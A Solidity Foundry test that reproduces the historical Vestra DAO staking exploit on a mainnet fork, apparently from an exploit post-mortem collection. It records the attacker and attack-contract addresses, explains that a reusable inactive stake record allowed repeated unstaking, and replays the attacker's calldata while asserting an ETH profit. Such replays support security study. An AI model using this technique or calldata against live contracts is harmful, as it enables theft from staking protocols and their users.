// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$500K
    - Attacker: 0x954386cb43dd2f0f637710a10f6b2d0f86aacb97
    - Attack Contract: 0x81AD996Ac000D5DFdC65880a9e4ee487629375c4
    - Vulnerable Staking Contract: 0x8A30D684B1d3F8F36b36887a3DeCA0eF2A36a8e3
    - Representative Attack Tx: https://etherscan.io/tx/0xa0dcf9b177702c58c5d0353aff2caeab12589bce204fb2d0e62ccbf5717f1798
    - Analysis: https://medium.com/coinmonks/decoding-vestra-daos-500k-exploit-overview-c1a710e0ea9f

    Vestra's unStake path left an inactive stake record reusable. The historical
    helper repeatedly unstaked the same position, sold the duplicated VSTR rewards,
    and returned the resulting ETH to the attacker.
*/

contract VestraDAOExploitTest is Test {
    address private constant ATTACKER = 0x954386cB43Dd2F0f637710a10F6b2d0F86AACb97;
    address private constant ATTACK_CONTRACT = 0x81AD996AC000d5dfdC65880a9E4ee487629375c4;

    function setUp() public {
        vm.createSelectFork("mainnet", 21_329_624);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack contract");
    }

    function testExploit() public {
        bytes memory attackCalldata =
            hex"f599d321000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001";
        uint256 attackerBefore = ATTACKER.balance;

        vm.prank(ATTACKER, ATTACKER);
        (bool success,) = ATTACK_CONTRACT.call{value: 0.2 ether}(attackCalldata);
        assertTrue(success, "historical Vestra exploit call reverted");

        uint256 nativeProfit = ATTACKER.balance - attackerBefore;
        emit log_named_decimal_uint("ETH profit", nativeProfit, 18);
        assertGt(nativeProfit, 100 ether, "Vestra exploit did not reproduce");
    }
}
